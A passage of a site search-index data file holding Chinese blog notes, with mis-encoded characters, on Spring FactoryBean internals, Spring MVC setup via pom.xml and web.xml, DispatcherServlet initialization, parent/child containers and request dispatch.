æ¯å¦å·²è¢«æ§è¡è¿\n    object object = getcachedobjectforfactorybean(beanname);\n    if (object == null) {\n        // è½¬æ factorybean\n        factorybean<?> factorybean = (factorybean<?>) beaninstance;\n        // å·ä½æ§è¡\n        object = getobjectfromfactorybean(factorybean, beanname);\n    }\n    return object;\n}\n\nprotected object getobjectfromfactorybean(factorybean factory, string beanname) {\n    // å¤æ­æ¯å¦åä¾ï¼åä¾ä¼æ·»å å° factorybeanobjectcache æ¹è¯¥mapä¸­ï¼é¿åéå¤\n    if (factory.issingleton()) {\n        // è·å\n        object object = this.factorybeanobjectcache.get(beanname);\n        // å¤æ­æ¯å¦å­å¨\n        if (object == null) {\n            // æ§è¡\n            object = dogetobjectfromfactorybean(factory, beanname);\n            this.factorybeanobjectcache.put(beanname, (object != null ? object : null_object));\n        }\n        return (object != null_object ? object : null);\n    } else {\n        return dogetobjectfromfactorybean(factory, beanname);\n    }\n}\n\nprivate object dogetobjectfromfactorybean(final factorybean factory, final string beanname){\n    try {\n        // è°ç¨æ¥å£æ¹æ³\n        return factory.getobject();\n    } catch (exception e) {\n        throw new beansexception("factorybean threw exception on object[" + beanname + "] creation", e);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\nè¿ç§æ¹å¼å¯ä»¥çè§£ä¸ºï¼å®ç° factorybean çç±»æ¯ä¸ä¸ªä»£çç±»ï¼ä»çå·¥ä½ä¸»è¦æ¯å¨èªå·±è¢«åå»ºçæ¶åï¼æç§ spring ççå½å¨æï¼åå»ºèªå·±çå®ä¾ï¼å¡«åå±æ§ï¼åå§åä¹åæ§è¡ï¼åå§åæ§è¡ï¼åå§åä¹åæ§è¡ï¼è¿ä¸åé½åªæ¯ä¸ºè¢«ä»£çç±»åå¥½æ¡ä»¶éºè®¾ï¼ç­è¿ä¸ªä»£çç±»åå»ºå®æ¯åï¼ä¼æ§è¡ getobjectforbeaninstance æ¹æ³ï¼è¿åè¢«ä»£ççç±»ãæ´ç®åççè§£å°±æ¯ factorybean å¯ä»¥å¸®æä»¬å¶é æä»¬æ³è¦ç beanï¼ä¾å¶ä» bean ä¾èµæä½¿ç¨ã',charsets:{cjk:!0}},{title:"Spring MVC ä¹åºæ¬å·¥ä½åç",frontmatter:{title:"Spring MVC ä¹åºæ¬å·¥ä½åç",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-mvc/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/22.spring%20mv/200.Spring%20MVC%20%E4%B9%8B%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.html",relativePath:"00.java/20.Spring/22.spring mv/200.Spring MVC ä¹å·¥ä½åç.md",key:"v-7c3f2df1",path:"/spring/spring-mvc/200/",headers:[{level:2,title:"æ­å»º",slug:"æ­å»º",normalizedTitle:"æ­å»º",charIndex:2},{level:2,title:"DispatcherServlet åå§åè®²è§£",slug:"dispatcherservlet-åå§åè®²è§£",normalizedTitle:"dispatcherservlet åå§åè®²è§£",charIndex:2998},{level:2,title:"ç¶å­å®¹å¨",slug:"ç¶å­å®¹å¨",normalizedTitle:"ç¶å­å®¹å¨",charIndex:6566},{level:2,title:"ä»£ç åä»£xmléç½®",slug:"ä»£ç åä»£xmléç½®",normalizedTitle:"ä»£ç åä»£ xml éç½®",charIndex:8920},{level:2,title:"è¯·æ±å®ç°",slug:"è¯·æ±å®ç°",normalizedTitle:"è¯·æ±å®ç°",charIndex:10086}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"æ­å»º DispatcherServlet åå§åè®²è§£ ç¶å­å®¹å¨ ä»£ç åä»£xmléç½® è¯·æ±å®ç°",content:'# æ­å»º\n\n 1. éç½® pom.xml\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    \x3c!-- spring åé½æ --\x3e\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.7.10</version>\n        <relativePath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n\n    <groupId>com.fengqianrun</groupId>\n    <artifactId>study-springMVC</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n    \x3c!-- tomcat è®¤warå --\x3e\n    <packaging>war</packaging>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    </properties>\n\n    <dependencies>\n        \x3c!-- åªä½¿ç¨mvc --\x3e\n        <dependency>\n            <groupId>org.springframework</groupId>\n            <artifactId>spring-webmvc</artifactId>\n        </dependency>\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n 2. åå»º webapp/WEB-INF ç®å½ï¼å¹¶åå»º web.xml æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!-- è¿ä¸ªæä»¶æ¯tomcatè¦å»è¯»åçæä»¶ï¼æä»¶è·¯å¾å¿é¡»å¨ webapp/WEB-INF ä¸ï¼webappå javaæ¯åçº§ç®å½ --\x3e\n<web-app>\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/WEB-INF/spring.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. åå»º /WEB-INF/spring.xml æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n    <context:component-scan base-package="com.fengqianrun.mvc" />\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. éç½® tomcatï¼Deployment ä¸­éç½® warï¼å¹¶ä¿®æ¹ Application context\n 5. è®¿é® url\n\nè®¿é®å°åä¸º http://ip:port/tomcatéç½®çApplication context/web.xmléçservlet-name/controller/method\n\n\n1\n\n\n\n# DispatcherServlet åå§åè®²è§£\n\nDispatcherServlet ç»§æ¿èª HttpServletBeanï¼å¶æç»ç¶ç±»è¿æ¯ Servletï¼åªæ¯å®ç°äºè§èï¼éåäºä¸äºæ¹æ³ã æ¯å¦ HttpServletBean è¯¥ç±»éåäº init () æ¹æ³ï¼å¨å¯å¨æå® DispatcherServlet çæ¶åï¼ä¼è°ç¨è¢«éåç init æ¹æ³ãæ´ä½ init æµç¨å¦ä¸ï¼\n\næ´ä¸ª DispatcherServlet å è½½æµç¨ï¼\n1. tomcatä¼è°ç¨servletçinit()æ¹æ³\n2. HttpServletBeanéåäºinit()æ¹æ³\n    2.1 è¯»åweb.xmléé¢çåå®¹å¹¶å°è£\n    2.2 æ§è¡æ ¸å¿ initServletBean() æ¹æ³\n    2.3 initServletBean() æ¹æ³è°ç¨ initWebApplicationContext()\n3. initWebApplicationContext æ¹æ³ï¼ç¨äºåå»º context ä¸ä¸æ\n    3.1 è°ç¨findWebApplicationContext()æ¥è¯¢ web.xml æ¯å¦èªå®ä¹äº contextAttribute è¿ä¸ªå±æ§\n    3.2 æ²¡ç¨èªå®ä¹å createWebApplicationContext(rootContext) åå»º org.springframework.web.context.support.XmlWebApplicationContext å®ä¾ï¼å¹¶è·ç¶å®¹å¨ç»å®ã\n    3.3 ç» context è®¾ç½®ç¯å¢ä¿¡æ¯ wac.setEnvironment(getEnvironment());\n    3.4 è®¾ç½®å®ä¹ contextConfigLocation(/WEB-INF/spring.xml) çè·¯å¾\n    3.5 è°ç¨ configureAndRefreshWebApplicationContext() æ¹æ³\n4. configureAndRefreshWebApplicationContext æ¹æ³ï¼éç½®contextä¸ä¸æï¼å¹¶åå§åbean\n    4.1 è®¾ç½®ä¸ä¸æ IDï¼ä¸º`åºç¨åç§°`+`servlet-name`\n    4.2 æå·²æçä¸ä¸æ(cotent)ä»¥åéç½®(config)è®¾ç½®å°æ°çcontextä¸­\n    4.3 ç»æ°çcontextæ·»å ä¸ä¸ªApplicationListenerï¼ä¸»è¦ä¸º ContextRefreshListenerï¼å½ä¸ä¸æå·æ°å®æ¯åéç¥ï¼è¯¥ç±»è¢«éç¥ä¼è°ç¨ **FrameworkServlet.this.onApplicationEvent(event);** æ¹æ³ï¼è¿ä¸ªæ¹æ³å¾éè¦\n    4.4 è°ç¨ refresh() æ¹æ³ï¼æ§è¡ bean çåå§åæä½ï¼springé£ä¸å¥ï¼ï¼æ§è¡å®è°ç¨ this.finishRefresh(); ä¹å°±éç¥å° 4.3 ä¸­ç ContextRefreshListenerå¯¹è±¡å¹¶è°ç¨ FrameworkServlet.this.onApplicationEvent(event);\n5. FrameworkServlet.this.onApplicationEvent(event);è°ç¨å°DispatcherServlet.initStrategies()æ¹æ³å¹¶ä¼æ§è¡ä»¥ä¸åç§æ¹æ³ï¼ \n    initMultipartResolver(context);\n    initLocaleResolver(context);\n    initThemeResolver(context);\n    initHandlerMappings(context); \n    initHandlerAdapters(context);\n    initHandlerExceptionResolvers(context);\n    initRequestToViewNameTranslator(context);\n    initViewResolvers(context);\n    initFlashMapManager(context);\n6. initHandlerMappingsï¼ç¨äºæå·²ç»å è½½å°springå®¹å¨çå¯¹è±¡è¿è¡ææ£ï¼æå®ç°äº @RequestMapping | @Controller çBeanæåºæ¥å¹¶å¾å°ææå®ç°äº@RequestMappingæ³¨è§£çæ¹æ³ æ³¨åå° mappingRegister å®¹å¨ä¸­\n    6.1 ä»å®¹å¨ä¸­è¯»åå°å®ç°äºHandlerMapping.class çBeanï¼è¿éå°±æ¯æ¾æä»¬èªå®ä¹å®ç°äºHandlerMapping.classçBean\n    6.2 å¦ææ²¡æèªå®ä¹ç HandlerMappingï¼ä¼å è½½é»è®¤ç HandlerMappingï¼é»è®¤æ BeanNameUrlHandlerMapping,RequestMappingHandlerMapping,RouterFunctionMapping,ææ¾å°çæ³¨åå° Beanå®¹å¨ä¸­\n        6.2.1 RequestMappingHandlerMapping å¨æ³¨åBeançæ¶åä¼æ§è¡ afterPropertiesSet()æ¹æ³ï¼è¯¥æ¹æ³éé¢ä¼å¾å°ææBeanï¼å¹¶å¤æ­ç±»åæ¯å¦æ¯æ Controller.class æ RequestMapping.class æ³¨è§£ï¼å¦æç¬¦åæ¡ä»¶ä»£è¡¨ä½ æ¯ä¸ä¸ª ControllerHandler\n        6.2.2 å¦ææ¯ä¸ä¸ª ControllerHandlerï¼åè·åè¯¥ç±»ä¸­çæ¹æ³å¹¶å¾å°æåªå«æRequestMapping.classæ³¨è§£çæ¹æ³ï¼å¹¶ä¸è§£ææ³¨è§£ä¸çåæ°,ææ¹æ³æ³¨åå°ä¸ä¸ª mappingRegistry é\n    6.3 BeanNameUrlHandlerMapping æ¯ç± ApplicationContextAware æç¥è°ç¨åå§åæ¹æ³ç\n        6.3.1 BeanNameUrlHandlerMapping å RequestMappingHandlerMapping è§£æçæ¹å¼ä¸ä¸æ ·ï¼BeanNameUrlHandlerMappingå¾å°å®¹å¨ä¸­ææBeanï¼ä¼å¤æ­BeanNameçåç¼ä»¥ \'/\'å¼å¤´å¹¶æ¶éï¼å¹¶ä¸æ³¨åå° handlerMapä¸­\n        6.3.2 BeanNameUrlHandlerMapping åå¶ä»controlleråæ³ä¸ä¸æ ·ï¼å·ä½è¦ç»ç±»å  @Component("/test") å¹¶ä¸è¿æå®ç° implements Controller\n        6.3.3 æ¾å°å¹éæ¡ä»¶çæ¹æ³æä»ç»´æ¤å°èªå·±ç handlerMap ä¸­\n    6.4 æ³¨æ BeanNameUrlHandlerMapping å RequestMappingHandlerMappingç»´æ¤äºä¸åç handler å®¹å¨ï¼æä»¥ç¸åçè¯·æ±è·¯å¾ä¸ä¼æ¥éï¼å¦æç¸åï¼æ§è¡BeanNameUrlHandlerMappingçæ¹æ³ï¼å ä¸ºä¼åçº§æ¯RequestMappingHandlerMappingé å\n7. initHandlerAdaptersï¼åå§åæ¹æ³ä¼åææéè¦çåå¤å¥½å è½½è¿å»\n    7.1 initHandlerAdapters ä»springå®¹å¨ä¸­æ¾å äº @ControllerAdvice çBean\n    7.2 å¾å°Beanåå¤æ­å äº @ModelAttribute çæ³¨è§£ä½ä¸åå«æ @RequestMappingæ³¨è§£çæ¹æ³ å­å° modelAttributeAdviceCacheä¸­\n    7.3 å¾å°Beanåå¤æ­å äº @InitBinder çæ¹æ³ å­å° initBinderAdviceCache ä¸­\n    7.4 ä»å®¹å¶ä¸­å¾å°ææå®ç° RequestBodyAdvice æ ResponseBodyAdvice æ¥å£ï¼è®°å½ä¸æ¥\n    7.5 åå§å HttpRequestHandlerAdapterãSimpleControllerHandlerAdapterãRequestMappingHandlerAdapterãHandlerFunctionAdapter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# ç¶å­å®¹å¨\n\nç¶å­å®¹å¨ï¼å°±æ¯å¨ä¸ä¸ª web.xml éé¢æå®ä¸¤ä¸ª servletï¼å è½½ä¸åç spring.xmlï¼å±äº«ä¸ä¸ª listener ç¶å®¹å¨çå¯¹è±¡ãæ³¨æï¼ç¶å®¹å¨æ¯ä¼å¨ servlet èç¹ä¹åè§£æçãç¶å­å®¹å¨å·ä½å®ç°å¦ä¸ï¼\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!-- è¿ä¸ªæä»¶æ¯tomcatè¦å»è¯»åçæä»¶ï¼æä»¶è·¯å¾å¿é¡»å¨ webapp/WEB-INF ä¸ï¼webappå javaæ¯åçº§ç®å½ --\x3e\n<web-app>\n    \n    \x3c!-- ç¶å®¹å¨ --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n    </listener>\n\n    <context-param>\n        <param-name>contextConfigLocation</param-name>\n        \x3c!-- æè¿°beançæä»¶ --\x3e\n        <param-value>/WEB-INF/spring2.xml</param-value>\n    </context-param>\n\n    \x3c!-- å­1 --\x3e\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/WEB-INF/spring.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n\n    \x3c!-- å­2 --\x3e\n    <servlet>\n        <servlet-name>app1</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/WEB-INF/spring1.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app1</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app1/*</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\nContextLoaderListener ä¼åå»ºä¸ä¸ªå®¹å¨ ApplicationContextï¼è§£æéç½®ç xml æä»¶ï¼èµ° spring å¸¸è§ç Bean å è½½æµç¨ã è¿ä¸ª ApplicationContext ä¼è¢«åä¸º servlet çç¶å®¹å¨è¢«å è½½å° servletContextï¼mapï¼ä¸­ï¼å½ servlet è¢«å è½½çæ¶åä¼åç¶å®¹å¨è¿è¡ç»å®ï¼è¯¦è§ DispatcherServlet åå§åè®²è§£ 3.2\n\n\n# ä»£ç åä»£ xml éç½®\n\næ´ä½å xml æ¯å·®ä¸å¤ç\n\npublic class MyWebApplicationInitializer implements WebApplicationInitializer {\n    \n    @Override\n    public void onStartup(ServletContext servletContext) throws ServletException {\n        // Load Spring web application configuration\n        AnnotationConfigWebApplicationContext context = new AnnotationConfigWebApplicationContext();\n        context.register(AppConfig.class);\n\n        // Create and register the DispatcherServlet\n        DispatcherServlet servlet = new DispatcherServlet(context);\n        ServletRegistration.Dynamic registration = servletContext.addServlet("app", servlet);\n        registration.setLoadOnStartup(1);\n        registration.addMapping("/app/*");\n    }\n\n    @ComponentScan("com.fengqianrun.mvc")\n    public class AppConfig{\n\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nMyWebApplicationInitializer è¢«å è½½æ¯éè¿ SpringServletContainerInitializer å®ç°äº ServletContainerInitializer çè§èï¼å¨ SpringServletContainerInitializer ä¸­æä¸ä¸ª @HandlesTypesï¼éé¢å°±å®ä¹äº WebApplicationInitializerï¼ä¼æè¯¥ç±»å è½½ä¼ å¥ SpringServletContainerInitializer ç onStartup æ¹æ³ï¼è¯¥æ¹æ³éé¢ç»§ç»­è°ç¨å®ç°äº WebApplicationInitializer ç onStartup æ¹æ³\n\n\n# è¯·æ±å®ç°\n\næä»¬é½ç¥éæ©åºåä¸ä¸ª HttpServlet å¹¶å®ç° service () è½¬åå·ä½ doGet doPost å¹¶å®ç°ä¸å¡é»è¾ãDispatcherServlet ä¸æ ·å®ç°äº HttpServlet å¹¶éåäº serviceãdoGetãdoPost ç­æ¹æ³ï¼å®ç°å·ä½æµç¨æ¯ï¼\n\n1. ç±DispatcherServletçç¶ç±»FrameworkServletå·ä½å®ç°äºserviceãdoGetãdoPostæ¹æ³\n2. FrameworkServletä¼åè¢«è°ç¨service()æ¹æ³ï¼è§£ææ¹æ³çè¯·æ±æ¹å¼æ¯ get è¿æ¯ postï¼åè°ç¨HttpServletçservice()æ¹æ³è¿ä¸æ­¥å¤æ­æ¯è°ç¨ doGet è¿æ¯ doPostæ¹æ³\n3. HttpServletå¨è°ç¨FrameworkServletå·ä½å®ç°äºdoGetædoPostæ¹æ³\n    3.1 \n4. doPostå®ç°ä¼è°ç¨FrameworkServletçå­ç±»DispatcherServletçdoServiceæ¹æ³\n    4.1 doService é¦åä¼æå°è¯·æ±çä¿¡æ¯\n    4.2 æcontextæ·»å å° request çè¯·æ±ä¸­\n    4.3 flashMapManager\n    4.4 è°ç¨ doDispatch æ¹æ³\n5. doDispatch\n    5.1 å¾å°é»è®¤çä¸ä¸ª mappingï¼ BeanNameUrlHandlerMapping,RequestMappingHandlerMapping,RouterFunctionMappingï¼è¯¦ç»å¨DispatcherServlet åå§åè®²è§£6.2ä¸­ï¼\n    5.2 ä¾¿å©æ¯ä¸ª mappingï¼å¹¶å¾å°è¯·æ±çè·¯å¾ï¼æ ¹æ®è·¯å¾å»æ¾ handlerï¼è¿ä¸ªhandlerå°±æ¯DispatcherServlet åå§åè®²è§£6.2.2çæ¹æ³ï¼ï¼å¦ææ¯BeanNameUrlHandlerMappingæ¾å°çæ¯Beanï¼RequestMappingHandlerMappingæ¾å°çæ¯ HanlerMethod ç»ä¸ä¸º handler\n    5.3 æ¾å°handleråä¼å°è£ä¸ºä¸ä¸ª handleræ§è¡é¾ï¼è¿ä¸ªæ§è¡é¾åå«äºæ¦æªå¨ï¼æä»¥ç§°ä¸ºé¾\n    5.4 ç±äºè·åç handler æ¯ä¸ä¸ªobjectï¼æ æ³ç¡®å®æ¯BeanNameUrlHandlerMappingçBeanè¿æ¯RequestMappingHandlerMappingçHandlerMethodï¼æä»¥æ§è¡ getHandlerAdapter è¿è¡éé\n        5.4.1 æå·²ç»å è½½ç handlerAdapters è¿è¡ä¾¿å©ï¼DispatcherServlet åå§åè®²è§£ 7.5ï¼\n        5.4.2 æ¯ä¸ª handlerAdapter å®ç°æ¹å¼ä¸ä¸æ ·ï¼ä¼æä¸ªç»ä¸ç supports æ¹æ³æ¥å¤æ­æ¯å¦å®ç°äºä¸å mapping çè¦æ±ï¼å¹¶æ¾å°åéç adapter\n            5.4.2.1 å¦ RequestMappingHandlerMapping å¯¹åºçæ¯ RequestMappingHandlerAdapterï¼adapter ç supportsä¼å¤æ­æ¯å¦æ¯ HandlerMethod çå®ä¾ï¼æ¯åå¾å°è¿ä¸ª adapter\n        5.4.3 handleræ§è¡é¾å¼å§æ§è¡æ¦æªå¨ï¼ä¼éåææçæ¦æªå¨æ§è¡æ§è¡åç½®æ¹æ³ï¼å¦ææ¦æªå¨åç½®æ¹æ³è¿åfalseååé¢ä¸å¨æ§è¡\n        5.4.4 æ¦æªå¨æ§è¡å®æ¯åå°±å¯ä»¥æ§è¡å¾å°ç HandlerAdapter ç handler æ¹æ³ï¼å»çæ­£æ§è¡ controller çæ¹æ³ï¼è¿åå¼ä¼å°è£æ ModelAndView\n            5.4.4.1 æ£æ¥æ¯å¦éå¶äºè¯·æ±æ¹å¼ï¼æ¯å¦åªæ¯æ POST è¯·æ±\n            5.4.4.2 å¤æ­æ¯å¦å¼å¯sessionéï¼ç¨äºå¯¹ææç¸åsessionçè¯·æ±è¿è¡å¹¶åéå¶\n            5.4.4.3 æ§è¡invokeHandlerMethodæ¹æ³\n                5.4.4.3.1 æ¾åº@InitBinderåå»ºä¸ä¸ª binderFactory å·¥åï¼è¯¥å·¥åæ¯å¯¹Methodè¯·æ±åæ°åç±»åè½¬æ¢ï¼æ¾çæ¯å½åMethodæå¨å±ç@InitBinderçè½¬æ¢å¨\n                5.4.4.3.2 çæModelFactoryï¼æ@ModelAttributeçkeyåvalueï¼ä»¥å@SessionAttributesçkeyåvalueæ·»å å° Modelä¸­ï¼å¯ä»¥ä¿éå¨controllerçModelä¸­å¾å°æ°æ®\n                5.4.4.3.3 åå»ºä¸ä¸ªå¤çæ¹æ³çå¯¹è±¡ï¼è®¾ç½®æ¹æ³è§£æå¨ï¼è§£æ@RequestParamç­æ³¨è§£æå¯¹è±¡ï¼ï¼è¿åå¼è§£æå¨ï¼æ¯å¦å äº@ResponseBodyè¦è§£ææJSONï¼ï¼è®¾ç½®binderFactory\n                5.4.4.3.4 åå»º ModelAndViewContainerï¼ç»ModelAndViewContainer æ·»å è§£æçåå®¹ï¼åå§åï¼ï¼ç¶åå·ä½å»æ§è¡ invokAndHandler(req,ModelAndViewContainer)ï¼å¾å°æ´å¤çä¿¡æ¯ç» ModelAndViewContainerï¼æ¯å¦è¿åç»æ\n                5.4.4.3.5 æåå¯¹ ModelAndViewContainer è¿è¡å¤çï¼å¤æ­å½åè¯·æ±æ¯å¦è¿è¡äºéå®å\n        5.4.5 éè¿è¿åç ModelAndView æ¥æ¾å¹¶è®¾ç½®è§å¾\n        5.4.6 æ§è¡æ¦æªå¨åç½®æ¹æ³\n        5.4.7 è§å¾æ¸²æ\n        5.4.8 åè°ç¨æ¦æªçæ§è¡å®ææ¹æ³\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n',normalizedContent:'# æ­å»º\n\n 1. éç½® pom.xml\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    \x3c!-- spring åé½æ --\x3e\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.7.10</version>\n        <relativepath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n\n    <groupid>com.fengqianrun</groupid>\n    <artifactid>study-springmvc</artifactid>\n    <version>0.0.1-snapshot</version>\n    \x3c!-- tomcat è®¤warå --\x3e\n    <packaging>war</packaging>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n        <project.build.sourceencoding>utf-8</project.build.sourceencoding>\n    </properties>\n\n    <dependencies>\n        \x3c!-- åªä½¿ç¨mvc --\x3e\n        <dependency>\n            <groupid>org.springframework</groupid>\n            <artifactid>spring-webmvc</artifactid>\n        </dependency>\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n 2. åå»º webapp/web-inf ç®å½ï¼å¹¶åå»º web.xml æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n\x3c!-- è¿ä¸ªæä»¶æ¯tomcatè¦å»è¯»åçæä»¶ï¼æä»¶è·¯å¾å¿é¡»å¨ webapp/web-inf ä¸ï¼webappå javaæ¯åçº§ç®å½ --\x3e\n<web-app>\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/web-inf/spring.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. åå»º /web-inf/spring.xml æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n    <context:component-scan base-package="com.fengqianrun.mvc" />\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. éç½® tomcatï¼deployment ä¸­éç½® warï¼å¹¶ä¿®æ¹ application context\n 5. è®¿é® url\n\nè®¿é®å°åä¸º http://ip:port/tomcatéç½®çapplication context/web.xmléçservlet-name/controller/method\n\n\n1\n\n\n\n# dispatcherservlet åå§åè®²è§£\n\ndispatcherservlet ç»§æ¿èª httpservletbeanï¼å